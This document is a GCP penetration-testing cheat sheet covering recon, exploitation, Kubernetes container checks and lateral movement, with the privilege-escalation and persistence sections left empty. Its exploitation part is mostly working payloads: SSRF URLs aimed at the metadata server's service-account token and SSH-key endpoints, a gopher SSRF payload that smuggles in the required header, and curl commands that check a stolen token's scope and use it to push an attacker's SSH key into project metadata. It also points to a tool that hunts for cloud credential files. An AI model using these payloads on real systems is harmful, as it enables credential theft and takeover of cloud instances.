# GCP Pentest : Tools and Techniques

### MITRE Att&ck : Cloud Matrix
- https://attack.mitre.org/matrices/enterprise/cloud/

### GCP - Misc
#### GCP Access
##### Web console
- https://console.cloud.google.com  
--> Management UI (classical admin console interface with GUI accessible through browser)

##### Gcloud CLI
- https://cloud.google.com/sdk/docs/cheatsheet
--> Google Cloud CLI is a set of tools to create and manage Google Cloud resources.

Through click on the web console or gcloud CLI you will directly talk to Controle Plan APIs (Restfull).


## GCP â€“ Enumeration / Recon

### GCP - Azure - AWS IP ranges	
Python script performing the necessary actions for collecting the latest IP addresses used by Amazon Web Services, Google Compute, and Microsoft Azure.  

- https://github.com/chrismaddalena/UsefulScripts/blob/master/UpdateCloudIPs.py

### GCP Storage - GreyHatWarfare
Finding GCP Storage resources such as buckets:
- https://buckets.grayhatwarfare.com/

#### Accessing Onjects
- https://storage.googleapis.com/its_all_in_the_cloud/object001.jpg
	- storage.googleapis.com -> GCP
	- its_all_in_the_cloud -> Globally unique bucket name
	- object001.jpg -> Object Name

## GCP - Exploitation

#### GCP: Server Side Request Forgery (SSRF)
v1 and v1beta1 depecation : https://cloud.google.com/compute/docs/deprecations/v0.1-v1beta1-metadata-server

--> v1beta1 deprecated but sometimes works. 

- metadata.google.internal : 169.254.169.254

```
http://169.254.169.254/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/
http://metadata/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/hostname
http://metadata.google.internal/computeMetadata/v1/instance/id
http://metadata.google.internal/computeMetadata/v1/project/project-id
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
```

- Beta does NOT require a header atm (but normally deprecated)
```
http://metadata.google.internal/computeMetadata/v1beta1/
http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
```

- Use gopher SSRF to add the required headers
- Metadata-Flavor: Google
```
gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a
```

##### Accessing interesting files
- **SSH Public Key** : http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json
- **Get Access Token** : http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token
- **Kubernetes Key** : http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=jso

##### SSRF Exploitation scenario:
1. Extract the token
```
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json
```

2. Check the scope of the token
```
$ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA  

{ 
        "issued_to": "101302079XXXXX", 
        "audience": "10130207XXXXX", 
        "scope": "https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring", 
        "expires_in": 2443, 
        "access_type": "offline" 
}
```

3. Now push the SSH key
```
curl -X POST "https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata" 
-H "Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA" 
-H "Content-Type: application/json" 
--data '{"items": [{"key": "sshkeyname", "value": "sshkeyvalue"}]}'
```

### Validate a User Tokens
Query the Google API to validate and  determine token scope.
```
curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ywgfhdb3dyx-xj0_EofjsfFks53kdDF
```
- [gcp_check_token.py](https://github.com/Stage2Sec/CaptureTheCloud/blob/master/gcp_check_token.py)
- [gcp_get_token_gce_header.py](https://github.com/Stage2Sec/CaptureTheCloud/blob/master/gcp_get_token_gce_header.py)
- [gcp_get_token_gce_v1beta1.py](https://github.com/Stage2Sec/CaptureTheCloud/blob/master/gcp_get_token_gce_v1beta1.py)
Check access token is valid and it's scope via googleapis.com

###  Exploiting Kubernetes (K8s-GKE)
**Scenario** : You exploit a webapp and get command execution.  

#### Validate you are in container env
Check for environment variables for *kupepods* process
```
/bin/cat /proc/1/cgroup
```

If Docker in use, check for *.dockerenv* at /
```
ls -lah /
```

Check process list on the box (pid 1 is not **init** or **launchd**)
```
ps -aux

```

#### Accessing secrets
There is credentials (token) for the default service account. Kube-systems associates a pod with a service account credential (token).



## GCP - Lateral movement / pivoting
### SharpCloud
SharpCloud is a simple C# utility for checking for the existence of credential files related to Amazon Web Services, Microsoft Azure, and Google Compute.

##### Searches all user profiles for credentials related to Google Compute.
```
SharpCloud.exe gcloud
```

- https://github.com/chrismaddalena/SharpCloud


## GCP - Privilege Escalation

## GCP - Persistence

## GCP - Resources
